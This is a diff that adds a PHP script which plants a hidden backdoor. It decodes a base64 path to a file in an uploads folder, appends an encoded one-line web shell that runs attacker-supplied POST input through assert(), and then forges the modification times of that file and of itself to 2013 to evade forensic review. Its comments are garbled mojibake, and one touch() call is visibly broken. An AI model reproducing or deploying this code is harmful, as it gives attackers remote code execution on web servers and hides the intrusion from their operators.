@@ -1,0 +1,17 @@
+<?php
+        ob_start();
+        /*Ҫд·*/
+        $fp=fopen(base64_decode('c3RhdGljc1x1cGxvYWRzXHBob3RvXDIwMTcwMTA0XHRlc3QucGhw='),'a+');
+        /////shellж೤ǰƶ೤
+        fseek($fp,-32,SEEK_END);
+        //*shell1010*/
+        if(base64_encode(fgets($fp))=="PD9waHAgQGFzc2VydCgkX1BPU1RbJzEwMTAnXSk7Pz4="){exit;};
+        //Ϊʲô治һ˻...
+    @fputs($fp,base64_decode('DQo8P3BocCBAYXNzZXJ0KCRfUE9TVFsnMTAxMCddKTs/Pg==')); 
+        //޸shellʺ޸ʱ
+        touch(base64_decode('c3RhdGljc1x1cGxvYWRzXHBob3RvXDIwMTcwMTA0XHRlc3QucGhw='),mktime(19,5,10,10,26,2013));
+        fclose($fp);
+        //޸ĵǰļķʺ޸ʱ
+        touch(base64_decode('UTF-8'),mktime(19,5,10,10,26,2013));
+    ob_end_clean();
+        ?>
